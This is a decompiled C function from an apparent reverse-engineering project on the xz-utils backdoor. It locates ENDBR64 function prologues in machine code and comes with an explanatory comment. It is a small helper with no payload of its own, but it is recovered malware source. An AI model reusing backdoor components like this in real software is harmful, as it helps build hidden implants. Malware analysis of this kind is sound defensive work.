// /home/kali/xzre-ghidra/xzregh/100B10_find_function_prologue.c
// Function: find_function_prologue @ 0x100B10
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_function_prologue(u8 * code_start, u8 * code_end, u8 * * output, FuncFindType find_mode)


/*
 * AutoDoc: Validates that an address matches the requested prologue form.
 * For `FIND_ENDBR64` it zeros a decoder, runs `x86_dasm`, requires the ENDBR64 opcode, and only succeeds if the pad ends on a 16-byte boundary (returning the first post-pad instruction through `output`).
 * In legacy mode it calls `is_endbr64_instruction` with the simple mask and, on success, returns the prologue address itself so callers can sweep until a match is found.
 */

#include "xzre_types.h"

BOOL find_function_prologue(u8 *code_start,u8 *code_end,u8 **output,FuncFindType find_mode)

{
  BOOL prologue_found;
  BOOL decoded;
  long clear_idx;
  dasm_ctx_t *ctx_cursor;
  dasm_ctx_t prologue_ctx;
  
  if (find_mode == FIND_ENDBR64) {
    ctx_cursor = &prologue_ctx;
    for (clear_idx = 0x16; clear_idx != 0; clear_idx = clear_idx + -1) {
      *(undefined4 *)&ctx_cursor->instruction = 0;
      ctx_cursor = (dasm_ctx_t *)((long)&ctx_cursor->instruction + 4);
    }
    decoded = x86_dasm(&prologue_ctx,code_start,code_end);
    prologue_found = FALSE;
    if (((decoded != FALSE) && (*(u32 *)&prologue_ctx.opcode_window[3] == 3999)) &&
       (((ulong)(prologue_ctx.instruction + prologue_ctx.instruction_size) & 0xf) == 0)) {
      if (output != (u8 **)0x0) {
        *output = prologue_ctx.instruction + prologue_ctx.instruction_size;
      }
      prologue_found = TRUE;
    }
  }
  else {
    prologue_found = is_endbr64_instruction(code_start,code_end,0xe230);
    if (prologue_found != FALSE) {
      if (output != (u8 **)0x0) {
        *output = code_start;
      }
      prologue_found = TRUE;
    }
  }
  return prologue_found;
}

